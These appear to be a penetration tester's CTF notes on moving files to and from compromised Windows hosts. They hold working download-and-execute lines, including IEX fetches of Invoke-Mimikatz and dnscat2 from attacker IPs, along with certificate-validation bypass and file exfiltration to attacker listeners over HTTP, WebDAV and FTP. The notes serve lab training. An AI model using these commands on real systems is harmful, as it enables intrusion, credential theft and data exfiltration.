---
title: File Transfer - Windows
draft: false
tags:
---
## Linux to Windows

## Certutil
These days it is detected but we can still use it for ctfs:

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
### Base64

File transfer using base64 and md5sum

First check the file using md5sum:

```shell-session
jadu101@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Convert the target file with base64:

```shell-session
jadu101@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZ<snip>
```

Copy the content and use powershell to decode it:

```powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS<snip>"))
```

Confirm the transferred file using md5:

```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

This method is convenient but it is not always available. cmd.exe has max string length of 8191 characters. Also there might be strong lagging if the string is too long. 


### PowerShell Web Downloads

Most companies allows HTTP(s) outbound traffic.

Still, defender might not allow accessing certain file types such as .exe. 

#### File Download

Use **Net.WebClient**, **DownloadFile**:

```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

#### Fileless

Instead of downloading, run it directly on memory using **Invoke-Expression**:

```powershell-session
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.21:1234/dnscat2.ps1')


#### PowerShell Invoke-WebRequest

PowerShell 3.0, **Invoke-WebRequest** cmdlet is available. But very slow. 

```powershell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```



#### Powershell Download Errors

##### Internet Explorer misconfiguration

Sometimes when internet explorer is first launched, it is not configured correctly. 

We bypass this error using **-UseBasicParsing**:

```powershell-session
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

##### SSL not trusted

SSL/TLS secure channel certificate is not trusted sometimes. 

Bypass:

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

Create SMB server on attacking machine:

```shell-session
jadu101@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Download file from smb server:

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

#### SMB with creds

Newer ver of windows block unauthenticated guess access so we need creds for transferring:

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

Spin up smb server with username and password:

```shell-session
jadu101@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

mount smb server with username and pass:

```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

### FTP Download

Install **pyftpdblib**:

```shell-session
jadu101@htb[/htb]$ sudo pip3 install pyftpdlib
```

Set up Python3 FTP server:

```shell-session
jadu101@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

Powershell **Net.WebClient** could be used to download file from attacking FTP server:

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```


## Windows to Linux

Sometimes we must upload files from target machine to attack host.

### PowerShell Base64

Let's encode a file on windows and convert it on attacking machine.

Encoding file using powershell:

```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3<snip>

PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

Copy the base64 string to linux and convert it back using base64:

```shell-session
jadu101@htb[/htb]$ echo IyBDb3B5c<snip> | base64 -d > hosts
```

Confirm using md5sum:

```shell-session
jadu101@htb[/htb]$ md5sum hosts 

3688374325b992def12793500307566d  hosts
```

### PowerShell Web Uploads

#### Uploadserver PSUpload.ps1

Powershell doesn't have built-in upload function. But we can use **Invoke-WebRequest** or **Invoke-RestMethod** to build upload function. 

We need a webserver that accepts uploads. 

Install upload server on attacking machine:

```shell-session
jadu101@htb[/htb]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Start upload server:

```shell-session
jadu101@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

We can user **PSUpload.ps1**, which uses **Invoke-RestMethod** to upload files to the server. 

First download PSUpload.ps1 to the host machine:

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Upload the target file to upload server:

```powershell-session
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```


#### PowerShell Base64 Upload

Run netcat listener on attacking machine and send the base64 encode string towards it. 

On target machine, base64 encode the target file and send it to attacker's netcat listener:

```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Netcat listening on attacker machine receives base64 string:

```shell-session
jadu101@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
```

Decode the transferred string:

```shell-session
jadu101@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

#### PowerShell Variables

The following sequence of commands creates a PowerShell script named **wget.ps1** that performs the download of a file (**winpeas.exe**) from a specified URL (http://10.10.16.22/winpeas.exe) using the **System.Net.WebClient** class.

Obviously, I have Python HTTP server running with **winpeas.exe** on the server.


```powershell
c:\Users\Public>echo $storageDir = $pwd > wget.ps1

c:\Users\Public>echo $webclient = New-Object System.Net.WebClient >>wget.ps1

c:\Users\Public>echo $url = "http://10.10.16.22:80/winPEASany_ofs.exe" >>wget.ps1

c:\Users\Public>echo $file = "output-file.exe" >>wget.ps1

c:\Users\Public>echo $webclient.DownloadFile($url,$file) >>wget.ps1

c:\Users\Public>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

Now I have the file on the box:

[Reference](https://d00mfist.gitbooks.io/ctf/content/transfering_files_to_windows.html)


This also works sometimes:

```powershell
powershell -c “(new-object System.Net.WebClient).DownloadFile(‘http://10.10.14.7:8000/shell.bat','C:\Users\Administrator\.jenkins\temp\shell.bat')"
```

### SMB Transfer
We wil first start a SMB server on our Kali machine:

`impacket-smbserver share .` or `impacket-smbserver share . -smb2support -username jadu -password jadu`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-22.png)

On the target machine, let's connect to the created SMB server:

`net use * \\10.10.14.36\share` or `net use * \\10.10.16.25\share /u:jadu jadu`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-35.png)

Through the command `copy output.xml Y:` on target machine, we can copy the Applocker output to our local Kali machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-36.png)

### SMB WebDav Transfer

Companies usually allow outbound traffic for HTTP(s) but not for SMB.

We can run SMB over HTTP using **WebDav.WebDav**.

Let's configure WebDav Server. We need to install wsgidav and cheroot module:

```shell-session
jadu101@htb[/htb]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```

Spin it up:

```shell-session
jadu101@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```

Now we can connect to the share using the DavWWWRoot directory:

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

Upload files:

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### FTP Uploads

We need Python module pyftpdlib.

Spin up ftp server:

```shell-session
jadu101@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

Use powershell to upload file to ftp:

```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

